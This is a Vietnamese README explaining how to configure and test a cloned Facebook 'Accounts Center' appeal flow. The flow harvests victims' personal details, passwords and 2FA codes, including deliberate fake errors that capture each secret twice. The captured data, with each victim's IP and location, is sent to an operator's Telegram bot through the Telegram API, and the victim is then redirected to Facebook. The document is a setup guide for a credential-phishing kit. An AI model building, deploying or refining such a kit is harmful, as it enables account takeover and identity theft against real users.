# Hướng dẫn Test Gửi Data về Telegram trên Localhost

## Bước 1: Tạo Telegram Bot và Lấy Token/Chat ID

### 1.1. Tạo Telegram Bot:

1. Mở Telegram và tìm **@BotFather**
2. Gửi lệnh: `/newbot`
3. Làm theo hướng dẫn:
   - Nhập tên bot (ví dụ: `My Test Bot`)
   - Nhập username bot (phải kết thúc bằng `bot`, ví dụ: `my_test_bot`)
4. BotFather sẽ trả về **Bot Token** dạng: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`
5. **Lưu token này lại** - bạn sẽ cần nó cho file `.env.local`

### 1.2. Lấy Chat ID:

**Cách 1: Qua Bot**
1. Tìm bot vừa tạo trên Telegram (search username của bot)
2. Gửi một message bất kỳ cho bot (ví dụ: `/start` hoặc `Hello`)
3. Mở trình duyệt, truy cập:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   (Thay `<YOUR_BOT_TOKEN>` bằng token bạn vừa nhận)
4. Tìm trong response JSON, tìm `"chat":{"id":123456789}`
5. **Lưu số ID này lại** - đây là Chat ID của bạn

**Cách 2: Qua @userinfobot**
1. Tìm bot **@userinfobot** trên Telegram
2. Gửi `/start` cho bot này
3. Bot sẽ trả về Chat ID của bạn

**Cách 3: Qua @getidsbot**
1. Tìm bot **@getidsbot** trên Telegram
2. Gửi `/start` cho bot này
3. Bot sẽ trả về Chat ID của bạn

## Bước 2: Tạo File .env.local

1. Tạo file `.env.local` trong thư mục root của project (`accounts-center-clone/.env.local`)
2. Thêm nội dung sau:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=123456789
```

**Lưu ý:**
- Thay `123456789:ABCdefGHIjklMNOpqrsTUVwxyz` bằng Bot Token thật của bạn
- Thay `123456789` bằng Chat ID thật của bạn
- **KHÔNG** commit file `.env.local` lên Git (đã có trong `.gitignore`)

## Bước 3: Khởi động Server

1. Mở terminal trong thư mục project
2. Chạy lệnh:
   ```bash
   npm run dev
   ```
3. Đợi server khởi động (thường là `http://localhost:3000`)

## Bước 4: Test Form Flow

### 4.1. Mở Form:
1. Truy cập: `http://localhost:3000/accounts-center`
2. Click vào nút **"Subscribe on Facebook"** hoặc bất kỳ nút nào trigger modal

### 4.2. Điền Form Bước 1 (AppealModal):
1. Điền các thông tin:
   - **Full Name**: `John Doe`
   - **Personal Email**: `john@example.com`
   - **Business Email** (optional): `business@example.com`
   - **Page Name** (optional): `My Page`
   - **Phone Number**: Chọn country code (tự động detect VN nếu bạn ở VN)
   - **Date of Birth**: Chọn ngày/tháng/năm
   - **Issue Description**: `Test description`
   - ✅ Checkbox "I agree to terms"
   - Toggle notification (optional)
2. Click **"Submit"**

### 4.3. Nhập Password Bước 2 (PasswordModal):
1. **Lần 1**: Nhập password bất kỳ (ví dụ: `password123`)
   - Click **"Continue"**
   - ❌ Sẽ báo lỗi (đây là behavior mong muốn)
   - ✅ **Data sẽ được gửi về Telegram lần 1** (check Telegram ngay!)
   
2. **Lần 2**: Nhập password lại (ví dụ: `password123`)
   - Click **"Continue"**
   - ✅ Sẽ pass qua bước tiếp theo
   - ✅ **Data sẽ được gửi về Telegram lần 2** (check Telegram ngay!)

### 4.4. Chọn Method Bước 3 (MethodModal):
1. Chọn một phương thức xác minh:
   - **App** (Authenticator app)
   - **SMS** (Số điện thoại)
   - **Email** (Email)
   - **WhatsApp** (WhatsApp)
2. Click **"Continue"**

### 4.5. Nhập 2FA Code Bước 4 (TwoFAModal):
1. **Lần 1**: Nhập code bất kỳ (ví dụ: `123456`)
   - Click **"Continue"**
   - ❌ Sẽ báo lỗi và lock 30 giây
   - ✅ **Data sẽ được gửi về Telegram lần 3** (check Telegram ngay!)
   
2. Đợi 30 giây (hoặc refresh trang để reset)
   
3. **Lần 2**: Nhập code lại (ví dụ: `123456`)
   - Click **"Continue"**
   - ✅ Sẽ pass qua bước cuối
   - ✅ **Data sẽ được gửi về Telegram lần 4** (check Telegram ngay!)

### 4.6. Success Bước 5 (SuccessModal):
1. Xem thông báo thành công
2. Click **"Go to Facebook"** để redirect

## Bước 5: Kiểm tra Logs

### 5.1. Kiểm tra Telegram:
- Mở Telegram và check chat với bot của bạn
- Bạn sẽ thấy **4 messages** được gửi về:
  1. Sau password attempt lần 1
  2. Sau password attempt lần 2
  3. Sau 2FA attempt lần 1
  4. Sau 2FA attempt lần 2

### 5.2. Kiểm tra Console (Terminal):
- Mở terminal nơi chạy `npm run dev`
- Nếu không có Telegram config, bạn sẽ thấy logs dạng:
  ```
  📨 Telegram Log (no config): [message content]
  ```

### 5.3. Kiểm tra Browser Console:
- Mở DevTools (F12)
- Tab **Console** để xem errors nếu có
- Tab **Network** để xem API calls:
  - `/api/submit-form`
  - `/api/log-event`

## Troubleshooting

### ❌ Không thấy message trong Telegram:

1. **Kiểm tra .env.local:**
   - Đảm bảo file `.env.local` đã được tạo đúng
   - Đảm bảo không có khoảng trắng thừa
   - Đảm bảo đã restart server sau khi tạo/sửa `.env.local`

2. **Kiểm tra Bot Token:**
   - Token phải đúng format: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`
   - Không có khoảng trắng hoặc ký tự lạ

3. **Kiểm tra Chat ID:**
   - Chat ID phải là số nguyên (ví dụ: `123456789`)
   - Không có dấu ngoặc kép hoặc ký tự lạ

4. **Kiểm tra Bot đã được start:**
   - Đảm bảo bạn đã gửi `/start` cho bot trước đó
   - Bot phải có thể nhận messages

5. **Kiểm tra Console:**
   - Xem terminal có lỗi gì không
   - Xem browser console có lỗi CORS hoặc network không

### ❌ Lỗi "Telegram API error":

- Kiểm tra Bot Token và Chat ID có đúng không
- Kiểm tra internet connection
- Thử gửi message thủ công qua browser:
  ```
  https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage?chat_id=<YOUR_CHAT_ID>&text=Test
  ```

### ❌ Location không detect đúng:

- Nếu đang ở localhost, hệ thống sẽ gọi `ipwho.is` từ browser để detect IP thật
- Kiểm tra browser console xem có lỗi CORS không
- Nếu có lỗi CORS, có thể cần dùng proxy hoặc test trên môi trường production

## Format Message trong Telegram

Mỗi message sẽ có format HTML với các thông tin:
- **IP Address**: IP của người dùng
- **Location**: Country, City, Region
- **Form Details**: Tất cả thông tin form đã điền
- **Password Attempts**: Danh sách các password đã nhập
- **2FA Attempts**: Danh sách các 2FA code đã nhập

Tất cả data được format trong `<code>` tags để có thể click và copy dễ dàng trong Telegram.

## Test Checklist

- [ ] Đã tạo Telegram Bot và có Bot Token
- [ ] Đã lấy Chat ID
- [ ] Đã tạo file `.env.local` với đúng format
- [ ] Đã restart server sau khi tạo `.env.local`
- [ ] Đã điền form và submit
- [ ] Đã nhập password lần 1 → Check Telegram message 1
- [ ] Đã nhập password lần 2 → Check Telegram message 2
- [ ] Đã chọn 2FA method
- [ ] Đã nhập 2FA code lần 1 → Check Telegram message 3
- [ ] Đã nhập 2FA code lần 2 → Check Telegram message 4
- [ ] Đã thấy success message

## Lưu ý

- **Không commit `.env.local`** lên Git
- Test trên localhost có thể có rate limit từ Telegram API
- Nếu test nhiều lần, có thể cần đợi một chút giữa các lần test
- Location detection trên localhost sẽ detect IP thật của bạn, không phải localhost IP
